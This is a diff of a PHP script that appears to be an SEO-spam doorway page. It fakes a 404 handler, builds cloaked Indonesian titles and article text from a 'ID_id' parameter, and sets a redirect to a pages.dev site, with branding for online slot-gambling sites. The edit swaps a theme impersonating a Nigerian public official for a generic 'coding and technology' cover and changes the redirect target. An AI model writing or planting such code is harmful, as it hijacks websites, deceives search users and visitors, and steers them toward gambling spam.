@@ -5,7 +5,7 @@ set_time_limit(0);
 function denied(): void {
     http_response_code(404);
     $file404 = __DIR__ . '/home.php';
-    if (file_exists($file404)) {
+    if (file_exists($file404)) {  
         include $file404;
     } else {
         echo "<h1>404 Not Found</h1>";
@@ -62,14 +62,14 @@ if (isset($_GET['ID_id'])) {
     $current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
     // SEO DATA (AUTO GENERATE)
-    $title = "$BRAND x $BRAND2 - Mendorong Kepemimpinan Transparan dan Perubahan Positif";
+    $title = "$BRAND x $BRAND2 - Mengenal Dunia Coding dan Teknologi Digital";
 
-    $description = "$BRAND x $BRAND2 menghadirkan informasi tentang kepemimpinan, pelayanan publik, transparansi pemerintahan, kegiatan sosial, dan kontribusi pembangunan masyarakat di Abia State.";
+    $description = "$BRAND x $BRAND2 hadir sebagai sumber informasi seputar teknologi, coding, pemrograman, pengembangan web, aplikasi, dan berbagai wawasan digital untuk membantu meningkatkan keterampilan teknologi.";
     
-    $artikel = "$BRAND x $BRAND2 merupakan tokoh yang aktif dalam bidang pelayanan publik dan kepemimpinan di Abia State, Nigeria. Melalui berbagai aktivitas pemerintahan, sosial, dan komunitas, ia berkomitmen terhadap nilai transparansi, efisiensi, inovasi, serta pembangunan masyarakat yang berkelanjutan.";
+    $artikel = "$BRAND x $BRAND2 dapat menjadi bagian dari ekosistem informasi digital yang membantu pembaca mengenal berbagai topik seputar teknologi, kode, pemrograman, pengembangan website, aplikasi, serta berbagai perkembangan dunia digital.";
 
     // Bisa diganti random image atau CDN sendiri
-    $image = "https://i.pinimg.com/1200x/09/a4/bb/09a4bbed1206ca47fc96853e8fca9390.jpg";  
+    $image = "https://i.pinimg.com/1200x/72/d5/b9/72d5b9d8bdab5f0bcdd31bffa4d56284.jpg";  
 
     // Canonical URL
     $canonical = $current_url;
@@ -79,7 +79,7 @@ if (isset($_GET['ID_id'])) {
 }
 
 // Redirect target
-$ampmek = "https://oluebubechukwu.pages.dev/?ID_id=$BRAND";
+$ampmek = "https://tebarkode.pages.dev/?ID_id=$BRAND";
 $logo = "https://www.residentviews.com/assets/logo/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 $favicon = "https://www.residentviews.com/assets/icon/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 ?>
